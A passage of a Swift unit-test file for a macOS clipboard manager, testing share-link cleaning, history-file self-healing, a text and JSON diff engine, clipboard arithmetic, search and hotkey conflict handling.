        XCTAssertTrue(guardState.allowHoverSelection(currentMouseLocation: CGPoint(x: 300, y: 500), uptime: 1.0))

        guardState.lock(at: CGPoint(x: 300, y: 500), uptime: 10.0)
        XCTAssertTrue(guardState.isLocked)
        // 面板滑入或列表滚动经过静止光标（0 位移）与桌面光学微抖动（< 3.5pt）：严格抑制悬停抢焦点
        XCTAssertFalse(guardState.allowHoverSelection(currentMouseLocation: CGPoint(x: 300, y: 500), uptime: 10.25))
        XCTAssertFalse(guardState.allowHoverSelection(currentMouseLocation: CGPoint(x: 302, y: 501), uptime: 10.30))
        XCTAssertTrue(guardState.isLocked)

        // 用户真实移动鼠标（位移 5pt >= 3.5pt）：立即解锁放行
        XCTAssertTrue(guardState.allowHoverSelection(currentMouseLocation: CGPoint(x: 305, y: 500), uptime: 10.35))
        XCTAssertFalse(guardState.isLocked)

        // 鼠标物理点击直接解锁
        guardState.lock(at: CGPoint(x: 100, y: 100), uptime: 20.0)
        guardState.unlock()
        XCTAssertFalse(guardState.isLocked)

        // 2. ⌥1 ~ ⌥7 标准模式与 ⌥1 ~ ⌥6 极简模式虚拟键码精确映射（特别验证 macOS kVK_ANSI_5=23、6=22、7=26）
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(18), .all)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(19), .todo)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(20), .pinned)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(21), .text)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(23), .link)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(22), .image)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(26), .file)

        // 开启极简纯净模式时，「待办」分类自动隐身，回归纯粹 6 分类
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(18, minimalMode: true), .all)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(19, minimalMode: true), .pinned)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(20, minimalMode: true), .text)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(21, minimalMode: true), .link)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(23, minimalMode: true), .image)
        XCTAssertEqual(ClipFilterTab.fromOptionKeyCode(22, minimalMode: true), .file)
        XCTAssertNil(ClipFilterTab.fromOptionKeyCode(26, minimalMode: true))
        XCTAssertNil(ClipFilterTab.fromOptionKeyCode(28))

        // 3. 主 history.json 断电损坏时从 history.backup.json 零损自愈，并隔离损坏现场
        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-selfheal-\(UUID().uuidString)", isDirectory: true)
        let imagesDir = tempDir.appendingPathComponent("images", isDirectory: true)
        try FileManager.default.createDirectory(at: imagesDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }

        let primaryURL = tempDir.appendingPathComponent("history.json")
        let backupURL = tempDir.appendingPathComponent("history.backup.json")
        let corruptURL = tempDir.appendingPathComponent("history.corrupt.json")

        let pinnedItem = ClipItem(
            type: .text,
            text: "ssh prod-gateway",
            contentHash: "text:ssh",
            isPinned: true,
            customAlias: "生产网关"
        )
        let imageItem = ClipItem(
            type: .image,
            imageFileName: "referenced.png",
            contentHash: "img:ref"
        )
        HistoryPersistenceHelper.writeSnapshot([pinnedItem, imageItem], primaryURL: primaryURL, backupURL: backupURL)
        XCTAssertTrue(FileManager.default.fileExists(atPath: primaryURL.path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: backupURL.path))

        // 模拟异常截断损坏主文件
        try Data("{broken_json_eof".utf8).write(to: primaryURL)
        let healOutcome = HistoryPersistenceHelper.loadSnapshot(
            primaryURL: primaryURL,
            backupURL: backupURL,
            corruptURL: corruptURL
        )
        guard case .recoveredFromBackup(let recovered) = healOutcome else {
            return XCTFail("应当从原子备份无损自愈，实际结果：\(healOutcome)")
        }
        XCTAssertEqual(recovered.count, 2)
        XCTAssertEqual(recovered.first?.customAlias, "生产网关")
        XCTAssertTrue(FileManager.default.fileExists(atPath: corruptURL.path))
        let healedReload = HistoryPersistenceHelper.loadSnapshot(
            primaryURL: primaryURL,
            backupURL: backupURL,
            corruptURL: corruptURL
        )
        XCTAssertEqual(healedReload, .loadedPrimary(recovered))

        // 4. 孤儿图片精准清理：保护活跃引用图片与 60s 内新写入图片，仅清理陈旧无主图片
        let now = Date()
        let refFile = imagesDir.appendingPathComponent("referenced.png")
        let freshUnrefFile = imagesDir.appendingPathComponent("inflight.png")
        let staleOrphanFile = imagesDir.appendingPathComponent("orphan.png")

        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: refFile)
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: freshUnrefFile)
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: staleOrphanFile)

        try FileManager.default.setAttributes([.modificationDate: now.addingTimeInterval(-7200)], ofItemAtPath: refFile.path)
        try FileManager.default.setAttributes([.modificationDate: now.addingTimeInterval(-10)], ofItemAtPath: freshUnrefFile.path)
        try FileManager.default.setAttributes([.modificationDate: now.addingTimeInterval(-180)], ofItemAtPath: staleOrphanFile.path)

        let pruned = HistoryPersistenceHelper.pruneOrphanedImages(
            in: imagesDir,
            referencedFileNames: ["referenced.png"],
            minimumAgeSeconds: 60,
            now: now
        )
        XCTAssertEqual(pruned, 1)
        XCTAssertTrue(FileManager.default.fileExists(atPath: refFile.path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: freshUnrefFile.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: staleOrphanFile.path))
    }

    // MARK: - 31. 社媒分享口令剥壳提链（保护业务参数与配对括号）及终端 `路径:行列号` 访达解析测试

    @MainActor
    func testShareBlurbLinkExtractionAndLocalPathLineColResolution() throws {
        // 1. 小红书 / B站口令剥壳：自动在中文全角标点处截断，剥离追踪参数，严格保留分集 p=2 与小红书 xsec_token
        let xhsShare = "67 发布了一篇小红书笔记，快来看吧！😆 https://www.xiaohongshu.com/explore/66a1b2c3?xsec_token=KeepMe123&xhsshare=CopyLink&appuid=9988，复制本条信息，打开【小红书】App查看精彩内容！"
        XCTAssertEqual(
            URLTrackingCleaner.extractCleanShareURL(from: xhsShare),
            "https://www.xiaohongshu.com/explore/66a1b2c3?xsec_token=KeepMe123"
        )

        let biliShare = "【乔布斯产品演讲】 https://www.bilibili.com/video/BV1xx411c7mD/?p=2&spm_id_from=333.999&vd_source=abcdef123!"
        XCTAssertEqual(
            URLTrackingCleaner.extractCleanShareURL(from: biliShare),
            "https://www.bilibili.com/video/BV1xx411c7mD/?p=2"
        )

        // 2. 括号配对智能识别：剥除外层包裹括号，完整保留 Wikipedia 词条内部配对括号
        let wikiNote = "详见词条 (https://en.wikipedia.org/wiki/Swift_(programming_language))."
        XCTAssertEqual(
            URLTrackingCleaner.extractCleanShareURL(from: wikiNote),
            "https://en.wikipedia.org/wiki/Swift_(programming_language)"
        )

        // 3. 防误伤门控：Markdown 链接、JSON 字段与 cURL 命令绝不误触发分享口令剥壳
        XCTAssertNil(URLTrackingCleaner.extractCleanShareURL(from: "[iClip 官网](https://github.com/fanaruto/iClip)"))
        XCTAssertNil(URLTrackingCleaner.extractCleanShareURL(from: #"{"endpoint": "https://api.example.com/v1"}"#))
        XCTAssertNil(URLTrackingCleaner.extractCleanShareURL(from: "curl -s https://api.example.com/health"))

        // 4. 网盘链接 + 提取码混合文案：提取码与纯净链接双动作并存，且自动提链契约绝不误吞提取码消息
        let panShare = "通过网盘分享的文件：方案.pdf 链接：https://pan.baidu.com/s/1AbCdEf?utm_source=wechat 提取码：8829"
        let flowActions = MeetingAndEphemeralEngine.analyze(panShare)
        XCTAssertEqual(flowActions.map(\.id), ["otp-extract-code", "extract-share-url"])
        XCTAssertEqual(flowActions.last?.resultText, "https://pan.baidu.com/s/1AbCdEf")

        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-sharelink-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)
        _ = engine.adoptUserSuggestion("开启分享口令自动提取链接", in: .shared)
        XCTAssertTrue(engine.enabledAutoRules.contains(.extractCleanShareLink))
        XCTAssertEqual(
            engine.applyLearnedAutoTextRuleIfEnabled(rawText: biliShare, isLink: false)?.text,
            "https://www.bilibili.com/video/BV1xx411c7mD/?p=2"
        )
        // 含提取码/验证码的网盘消息不自动覆写，防止丢失提取码
        XCTAssertNil(engine.applyLearnedAutoTextRuleIfEnabled(rawText: panShare, isLink: false))

        // 5. 终端 / 编译器 `路径:行:列` 与 `file://...#L行号` 本地真实文件解析（支撑 ⌘O 访达高亮定位）
        let realFile = tempDir.appendingPathComponent("SampleSource.swift")
        try Data("struct Sample {}".utf8).write(to: realFile)

        let compilerDiag = "\(realFile.path):128:14"
        XCTAssertEqual(URLTrackingCleaner.resolveExistingLocalFileURL(from: compilerDiag)?.path, realFile.path)

        let fileURIWithAnchor = "file://\(realFile.path)#L10-L25"
        XCTAssertEqual(URLTrackingCleaner.resolveExistingLocalFileURL(from: fileURIWithAnchor)?.path, realFile.path)
    }

    // MARK: - 32. 原位剪贴差异对比引擎（`ClipboardDiffEngine` 行级 LCS、上下文折叠与 JSON 语义对齐）测试

    @MainActor
    func testClipboardDiffEngineContextCollapseAndJSONAlignment() throws {
        // 1. 多行配置修改：长公共前缀自动折叠，改动行严格按 `- 旧行` → `+ 新行` 呈现
        let oldConfig = (1...10).map { "line_\($0) = ok" }.joined(separator: "\n") + "\nport = 8080\nhost = localhost"
        let newConfig = (1...10).map { "line_\($0) = ok" }.joined(separator: "\n") + "\nport = 9090\nhost = localhost"

        let diff = try XCTUnwrap(ClipboardDiffEngine.computeDiff(older: oldConfig, newer: newConfig, contextLines: 2))
        XCTAssertEqual(diff.addedCount, 1)
        XCTAssertEqual(diff.removedCount, 1)
        XCTAssertFalse(diff.isJSONNormalized)
        XCTAssertEqual(diff.rows.first, .collapsedContext(hiddenLineCount: 8))
        XCTAssertTrue(diff.unifiedPatchText.contains("- port = 8080\n+ port = 9090"))

        // 2. 乱序与压缩 JSON 智能对齐：键值完全相同时精准给出「语义一致」，有字段变化时仅高亮真实差异行
        let jsonCompact = #"{"user":{"role":"guest","id":101},"code":0}"#
        let jsonReorderedPretty = "{\n  \"code\": 0,\n  \"user\": {\n    \"id\": 101,\n    \"role\": \"guest\"\n  }\n}"
        let semanticSame = try XCTUnwrap(ClipboardDiffEngine.computeDiff(older: jsonCompact, newer: jsonReorderedPretty))
        XCTAssertTrue(semanticSame.isJSONNormalized)
        XCTAssertFalse(semanticSame.hasChanges)
        XCTAssertEqual(semanticSame.tabBadgeTitle, "对比 #1 (语义一致)")

        let jsonUpdated = #"{"code":0,"user":{"id":101,"role":"admin"}}"#
        let jsonDiff = try XCTUnwrap(ClipboardDiffEngine.computeDiff(older: jsonCompact, newer: jsonUpdated))
        XCTAssertTrue(jsonDiff.isJSONNormalized)
        XCTAssertEqual(jsonDiff.addedCount, 1)
        XCTAssertEqual(jsonDiff.removedCount, 1)
        XCTAssertTrue(jsonDiff.unifiedPatchText.contains("-     \"role\" : \"guest\""))
        XCTAssertTrue(jsonDiff.unifiedPatchText.contains("+     \"role\" : \"admin\""))

        // 3. Space 与 ⌥Space 默认页签路由：普通文本按 Space 仍默认看原文，按 ⌥Space 直达对比页
        let plainItem = ClipItem(type: .text, text: oldConfig, contentHash: "text:cfg")
        let mockTabs = [
            QuickLookTabItem(id: "raw", title: "原始文本", payload: .text(oldConfig), toast: "", supportsSaveBack: true),
            QuickLookTabItem(id: QuickLookTabItem.diffLatestTabID, title: diff.tabBadgeTitle, payload: .text(diff.unifiedPatchText), toast: "", supportsSaveBack: false, diffResult: diff)
        ]
        XCTAssertEqual(QuickLookTabBuilder.defaultTabIndex(for: plainItem, tabs: mockTabs, preferDiff: false), 0)
        XCTAssertEqual(QuickLookTabBuilder.defaultTabIndex(for: plainItem, tabs: mockTabs, preferDiff: true), 1)
    }

    // MARK: - 33. 剪贴板金额免重敲续算（`* 13%` / `/ (1 + 6%)`）与百分号/取模消歧及手机号防误伤测试

    func testContextualClipboardMathPercentageAndPhoneNumberGuard() throws {
        // 1. 刚复制带货币符/千分位金额后，直接敲 `* 13%` 免重敲算出税额与会计大写
        let vat = try XCTUnwrap(InstantMathEvaluator.evaluate("* 13%", latestClipboardText: "¥12,800.00"))
        XCTAssertEqual(vat.plainValue, "1664")
        XCTAssertEqual(vat.formattedThousands, "1,664")
        XCTAssertEqual(vat.rmbUppercase, "壹仟陆佰陆拾肆元整")
        XCTAssertTrue(vat.isExplicitOrContextual)

        // 2. 括号内百分比与二元取模智能消歧：`1060 / (1 + 6%) = 1000`，同时 `17 % 5 = 2` 严格保留
        let taxExcl = try XCTUnwrap(InstantMathEvaluator.evaluate("/ (1 + 6%)", latestClipboardText: "1060元"))
        XCTAssertEqual(taxExcl.plainValue, "1000")

        let modulo = try XCTUnwrap(InstantMathEvaluator.evaluate("17 % 5"))
        XCTAssertEqual(modulo.plainValue, "2")

        // 3. 中文「万 / 亿」与货币符号直算
        let annual = try XCTUnwrap(InstantMathEvaluator.evaluate("3.5万 * 12"))
        XCTAssertEqual(annual.plainValue, "420000")
        XCTAssertEqual(annual.formattedThousands, "420,000")

        // 4. 防误伤门控：首条剪贴是 11 位手机号时绝不误当金额续算；本地路径 `/Users/...` 与 `+86...` 绝不误触发算式
        XCTAssertNil(InstantMathEvaluator.evaluate("* 2", latestClipboardText: "13800138000"))
        XCTAssertNil(InstantMathEvaluator.evaluate("/Users/fanaruto/Desktop", latestClipboardText: "12800"))
        XCTAssertNil(InstantMathEvaluator.evaluate("+8613800138000", latestClipboardText: "500"))
    }

    // MARK: - 34. 百分号编码中文 URL 可读展示/拼音检索与拖拽即成文件（SVG/JSON/MD/可读截图名）测试

    func testPercentEncodedChineseURLSearchAndDragFileMaterialization() throws {
        // 1. 浏览器复制的百分号编码中文 URL：卡片直显可读中文、支持中文与拼音首字母盲搜，且不篡改底层原始 URL
        let encodedWiki = "https://zh.wikipedia.org/wiki/%E7%AC%AC%E4%B8%80%E6%80%A7%E5%8E%9F%E7%90%86"
        let linkItem = ClipItem(type: .link, text: encodedWiki, contentHash: "link:wiki")
        XCTAssertEqual(linkItem.primaryTitle, "https://zh.wikipedia.org/wiki/第一性原理")
        XCTAssertEqual(linkItem.text, encodedWiki)
        XCTAssertTrue(linkItem.matches(query: "第一性原理"))
        XCTAssertTrue(linkItem.matches(query: "dyxyl"))

        // 2. 文本与代码拖拽类型智能推断（SVG / JSON / Markdown / CSV / Shell）与可读命名
        let svgText = #"<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10"/></svg>"#
        let svgSpec = DragFileExportHelper.inferTextArtifactSpec(for: svgText)
        XCTAssertEqual(svgSpec.ext, "svg")

        let jsonItem = ClipItem(
            type: .text,
            text: #"{"status":"ok","items":[1,2,3]}"#,
            contentHash: "text:json",
            customAlias: "订单接口示例"
        )
        let tempExportDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-dragexport-\(UUID().uuidString)", isDirectory: true)
        defer { try? FileManager.default.removeItem(at: tempExportDir) }

        let jsonExported = try XCTUnwrap(DragFileExportHelper.materializeExportFile(for: jsonItem, exportDirectory: tempExportDir))
        XCTAssertEqual(jsonExported.url.lastPathComponent, "订单接口示例.json")
        XCTAssertEqual(try String(contentsOf: jsonExported.url, encoding: .utf8), jsonItem.text)

        let mdItem = ClipItem(
            type: .text,
            text: "# 产品周会纪要\n\n- 完成性能优化\n- 发布新版本",
            contentHash: "text:md"
        )
        let mdExported = try XCTUnwrap(DragFileExportHelper.materializeExportFile(for: mdItem, exportDirectory: tempExportDir))
        XCTAssertEqual(mdExported.url.lastPathComponent, "产品周会纪要.md")

        // 3. 截图拖出告别乱码 UUID，优先采用用户备注名建立零拷贝导出文件
        let rawImgURL = tempExportDir.appendingPathComponent("97c87fcd-4a7e-4150-ba16-5d9852cf7b3.png")
        try Data([0x89, 0x50, 0x4E, 0x47]).write(to: rawImgURL)
        let imgItem = ClipItem(
            type: .image,
            imageFileName: rawImgURL.lastPathComponent,
            contentHash: "img:lic",
            customAlias: "深圳公司营业执照"
        )
        let imgExported = try XCTUnwrap(DragFileExportHelper.materializeExportFile(
            for: imgItem,
            sourceImageURL: rawImgURL,
            exportDirectory: tempExportDir
        ))
        XCTAssertEqual(imgExported.url.lastPathComponent, "深圳公司营业执照.png")
        XCTAssertTrue(FileManager.default.fileExists(atPath: imgExported.url.path))
    }

    // MARK: - 35. 跨语言应用别名与模态同义词盲搜（`vscode`/`wechat`/`浏览器`/`终端`/`截图`）及备注智能归类测试

    func testCrossLanguageAppSynonymSearchAndPinCategoryInference() throws {
        // 1. macOS 应用进程名与人类直觉搜索词双向映射（Code ↔ vscode、微信 ↔ wechat、iTerm2 ↔ 终端、Chrome ↔ 浏览器）
        let vscodeSnippet = ClipItem(type: .text, text: "const api = '/v1/users'", contentHash: "text:vsc", sourceAppName: "Code")
        XCTAssertTrue(vscodeSnippet.matches(query: "vscode"))
        XCTAssertTrue(vscodeSnippet.matches(query: "ide api"))

        let wechatAddr = ClipItem(type: .text, text: "南山区科技园 18 号", contentHash: "text:wx", sourceAppName: "微信")
        XCTAssertTrue(wechatAddr.matches(query: "wechat 科技园"))
        XCTAssertTrue(wechatAddr.matches(query: "聊天 南山"))

        let ghosttyCmd = ClipItem(type: .text, text: "ssh root@10.0.0.8", contentHash: "text:ssh", sourceAppName: "Ghostty")
        XCTAssertTrue(ghosttyCmd.matches(query: "终端 ssh"))
        XCTAssertTrue(ghosttyCmd.matches(query: "shell 10.0.0.8"))

        let chromeQuote = ClipItem(type: .text, text: "Stay hungry, stay foolish", contentHash: "text:quote", sourceAppName: "Google Chrome")
        XCTAssertTrue(chromeQuote.matches(query: "浏览器 hungry"))

        let shotItem = ClipItem(type: .image, imageFileName: "a.png", ocrText: "增值税电子普通发票", contentHash: "img:inv")
        XCTAssertTrue(shotItem.matches(query: "截图 发票"))
        XCTAssertTrue(shotItem.matches(query: "img 电子"))

        // 2. 备注命名自动推断收藏分组（开票财务 / 地址名片 / 常用话术 / 合同模板，普通备注保持 nil 不乱打标）
        XCTAssertEqual(PinCategory.infer(alias: "深圳总部开票税号", text: "91440300MA5F88888X"), .invoice)
        XCTAssertEqual(PinCategory.infer(alias: "公司前台收货地址", text: "深圳市南山区..."), .contact)
        XCTAssertEqual(PinCategory.infer(alias: "售后安抚客服话术", text: "非常抱歉给您带来不便"), .reply)
        XCTAssertEqual(PinCategory.infer(alias: "日报通知", text: "今日日期 {{date}}"), .template)
        XCTAssertNil(PinCategory.infer(alias: "生产跳板机命令", text: "ssh jump-prod"))
    }

    // MARK: - 36. IDE/终端语法高亮剪贴零误扰抑制、原子临时件自洁与数字顺位键码映射

    @MainActor
    func testIDECodeRichCopySparkSuppressionAndDigitKeyCodeMapping() throws {
        // 1. IDE 与终端默认附带 HTML/RTF 时不误触发「去样式」微星标，而浏览器富文本照常提供微星标
        let htmlTypes: [NSPasteboard.PasteboardType] = [.string, .html]
        XCTAssertFalse(RichTextPasteboardHelper.shouldOfferRichStripSpark(
            types: htmlTypes,
            plainText: "let answer = 42",
            sourceApp: "Antigravity"
        ))
        XCTAssertFalse(RichTextPasteboardHelper.shouldOfferRichStripSpark(
            types: htmlTypes + [NSPasteboard.PasteboardType("vscode-editor-data")],
            plainText: "function hello() {}",
            sourceApp: "UnknownForkIDE"
        ))
        XCTAssertFalse(RichTextPasteboardHelper.shouldOfferRichStripSpark(
            types: htmlTypes,
            plainText: "git status -s",
            sourceApp: "Ghostty"
        ))
        XCTAssertTrue(RichTextPasteboardHelper.shouldOfferRichStripSpark(
            types: htmlTypes,
            plainText: "这是一段来自网页博客带背景底色的文章段落",
            sourceApp: "Google Chrome"
        ))

        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent("iclip-ide-spark-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tempDir) }
        let engine = AdaptiveIntelligenceEngine(customDirectoryURL: tempDir)

        let idePlainItem = ClipItem(type: .text, text: "普通对话或代码片段", contentHash: "text:ide1", sourceAppName: "Cursor")
        XCTAssertNil(engine.evaluateSparkCandidate(for: idePlainItem, reuseCount: 1, minimalMode: false, hasRichFormatting: true))

        let browserRichItem = ClipItem(type: .text, text: "网页花哨样式文本", contentHash: "text:web1", sourceAppName: "Safari")
        let webSpark = engine.evaluateSparkCandidate(for: browserRichItem, reuseCount: 1, minimalMode: false, hasRichFormatting: true)
        XCTAssertEqual(webSpark?.actionID, "strip-rich-style")

        // 2. Foundation 原子写入残留 .sb-* 临时文件过期清理（保护新文件与正常 history.json）
        let historyFile = tempDir.appendingPathComponent("history.json")
        let staleTemp = tempDir.appendingPathComponent("history.json.sb-c149ea9b-Kw9zqw")
        try Data("[]".utf8).write(to: historyFile)
        try Data("stale".utf8).write(to: staleTemp)
        let removed = HistoryPersistenceHelper.pruneStaleAtomicTempFiles(
            in: tempDir,
            minimumAgeSeconds: 300,
            now: Date().addingTimeInterval(600)
        )
        XCTAssertEqual(removed, 1)
        XCTAssertTrue(FileManager.default.fileExists(atPath: historyFile.path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: staleTemp.path))

        // 3. 硬件数字键 1...9 精确映射（兼容 ⌘1~9 / ⌥⌘1~9 / ⇧⌘1~9）
        XCTAssertEqual(ClipFilterTab.digitFromKeyCode(18), 1)
        XCTAssertEqual(ClipFilterTab.digitFromKeyCode(23), 5)
        XCTAssertEqual(ClipFilterTab.digitFromKeyCode(25), 9)
        XCTAssertNil(ClipFilterTab.digitFromKeyCode(29))
    }

    // MARK: - 37. 全局快捷键多层级冲突检测与硬性拒绝设定保护

    func testHotKeyConflictDetectionAndHardBlocking() {
        let own = HotKeyShortcut.defaultShortcut // ⌥ V
        let others: [(shortcut: HotKeyShortcut, label: String)] = [
            (.defaultQueueShortcut, "顺序出队热键"),
            (.defaultCopyAppendShortcut, "跨处续接复制")
        ]

        // 1. 无修饰键或仅 Shift 搭配普通字符必须硬拦截（F1~F12 功能键除外）
        let bareV = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_V), carbonModifiers: 0)
        XCTAssertNotNil(HotKeyConflictValidator.staticConflictReason(for: bareV, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        let shiftOnlyA = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_A), carbonModifiers: UInt32(shiftKey))
        XCTAssertNotNil(HotKeyConflictValidator.staticConflictReason(for: shiftOnlyA, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        let shiftF6 = HotKeyShortcut(keyCode: UInt32(kVK_F6), carbonModifiers: UInt32(shiftKey))
        XCTAssertNil(HotKeyConflictValidator.staticConflictReason(for: shiftF6, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        // 2. macOS 系统核心基础快捷键硬拦截（⌘C / ⌘V / ⌘Space / ⌃Space / ⇧⌘4 / ⌘Q）
        let cmdC = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_C), carbonModifiers: UInt32(cmdKey))
        XCTAssertTrue(HotKeyConflictValidator.staticConflictReason(for: cmdC, role: .mainToggle, existingOwnShortcut: own, otherBindings: others)?.contains("复制") == true)

        let cmdSpace = HotKeyShortcut(keyCode: UInt32(kVK_Space), carbonModifiers: UInt32(cmdKey))
        XCTAssertTrue(HotKeyConflictValidator.staticConflictReason(for: cmdSpace, role: .mainToggle, existingOwnShortcut: own, otherBindings: others)?.contains("Spotlight") == true)

        let ctrlSpace = HotKeyShortcut(keyCode: UInt32(kVK_Space), carbonModifiers: UInt32(controlKey))
        XCTAssertNotNil(HotKeyConflictValidator.staticConflictReason(for: ctrlSpace, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        let shiftCmd4 = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_4), carbonModifiers: UInt32(cmdKey | shiftKey))
        XCTAssertNotNil(HotKeyConflictValidator.staticConflictReason(for: shiftCmd4, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        // 3. 应用内部其他全局槽位与面板内置快捷键冲突硬拦截（⌃⌥C / ⌃⌥V / ⌘P / ⌥1 / ⌥Space）
        XCTAssertTrue(HotKeyConflictValidator.staticConflictReason(for: .defaultCopyAppendShortcut, role: .mainToggle, existingOwnShortcut: own, otherBindings: others)?.contains("跨处续接复制") == true)
        XCTAssertTrue(HotKeyConflictValidator.staticConflictReason(for: .defaultQueueShortcut, role: .mainToggle, existingOwnShortcut: own, otherBindings: others)?.contains("顺序出队") == true)

        let cmdP = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_P), carbonModifiers: UInt32(cmdKey))
        XCTAssertNotNil(HotKeyConflictValidator.staticConflictReason(for: cmdP, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        let opt1 = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_1), carbonModifiers: UInt32(optionKey))
        XCTAssertNotNil(HotKeyConflictValidator.staticConflictReason(for: opt1, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        // 4. 当前自身原快捷键（⌥V）与无冲突自定义组合键（⇧⌘V / ⌃⌥X / ⌥Z）正常放行
        XCTAssertNil(HotKeyConflictValidator.staticConflictReason(for: own, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        let shiftCmdV = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_V), carbonModifiers: UInt32(cmdKey | shiftKey))
        XCTAssertNil(HotKeyConflictValidator.staticConflictReason(for: shiftCmdV, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))

        let optZ = HotKeyShortcut(keyCode: UInt32(kVK_ANSI_Z), carbonModifiers: UInt32(optionKey))
        XCTAssertNil(HotKeyConflictValidator.staticConflictReason(for: optZ, role: .mainToggle, existingOwnShortcut: own, otherBindings: others))
    }

    // MARK: - 38. 单键双击（⌘ / ⌥ / ⌃ / ⇧ / Fn）零误触状态机、JSON 兼容与冲突拦截测试

    func testSingleModifierDoubleTapStateMachineAndConflictGuard() throws {
        var machine = ModifierDoubleTapStateMachine(maxHoldDuration: 0.30, maxTapGap: 0.34)

        // 1. 干净双击左 Command (keyCode 55) -> 第一次松开返回 firstTapCompleted，第二次松开返回 doubleTapTriggered
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: .command, uptime: 10.00), .none)
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: [], uptime: 10.08), .firstTapCompleted(.command))
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: .command, uptime: 10.20), .none)
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: [], uptime: 10.28), .doubleTapTriggered(.command))

        // 2. 期间夹杂普通按键（如连按 ⌘C -> ⌘V 或 ⌘C×2 微星标）必须 100% 静默作废，绝不误弹面板
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: .command, uptime: 20.00), .none)
        machine.markInterferingEvent() // 按下了 C
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: [], uptime: 20.09), .none)
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: .command, uptime: 20.18), .none)
        machine.markInterferingEvent() // 按下了 V
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: [], uptime: 20.26), .none)

        // 3. 长按超过 maxHoldDuration (0.30s) 或左右不同物理键混按不误触发
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 58, flags: .option, uptime: 30.00), .none)
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 58, flags: [], uptime: 30.45), .none) // 长按作废

        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: .command, uptime: 40.00), .none)
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 55, flags: [], uptime: 40.08), .firstTapCompleted(.command))
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 54, flags: .command, uptime: 40.18), .none) // 右 Command (54) != 左 Command (55)
        XCTAssertEqual(machine.handleFlagsChanged(keyCode: 54, flags: [], uptime: 40.25), .firstTapCompleted(.command))

        // 4. 旧版无 doubleTapModifier 字段的持久化 JSON 无损解码兼容 + 双击单键槽位查重硬拦截
        let legacyJSON = Data(#"{"keyCode":9,"carbonModifiers":2048}"#.utf8)
        let decodedLegacy = try JSONDecoder().decode(HotKeyShortcut.self, from: legacyJSON)
        XCTAssertEqual(decodedLegacy, .defaultShortcut)
        XCTAssertFalse(decodedLegacy.isDoubleTap)

        let doubleCtrl = HotKeyShortcut.doubleTap(.control)
        XCTAssertEqual(doubleCtrl.displayString, "双击 ⌃")
        XCTAssertEqual(doubleCtrl.compactDisplayString, "⌃⌃")
        let conflictWithQueue = HotKeyConflictValidator.staticConflictReason(
            for: doubleCtrl,
            role: .mainToggle,
            existingOwnShortcut: .defaultShortcut,
            otherBindings: [(doubleCtrl, "顺序出队热键")]
        )
        XCTAssertTrue(conflictWithQueue?.contains("顺序出队热键") == true)
    }

    // MARK: - 39. 液态玻璃四角无毛边出血容器点击穿透与连续圆角遮罩校验

    @MainActor
    func testLiquidGlassBleedRootHitTestAndCornerMask() {
        let bleed: CGFloat = 36
        let cardFrame = NSRect(x: bleed, y: bleed, width: 420, height: 560)
        let windowBounds = NSRect(x: 0, y: 0, width: 492, height: 632)
        let bleedRoot = LiquidGlassBleedRootView(frame: windowBounds, cardFrame: cardFrame)
        let cardChild = NSView(frame: cardFrame)
        bleedRoot.addSubview(cardChild)

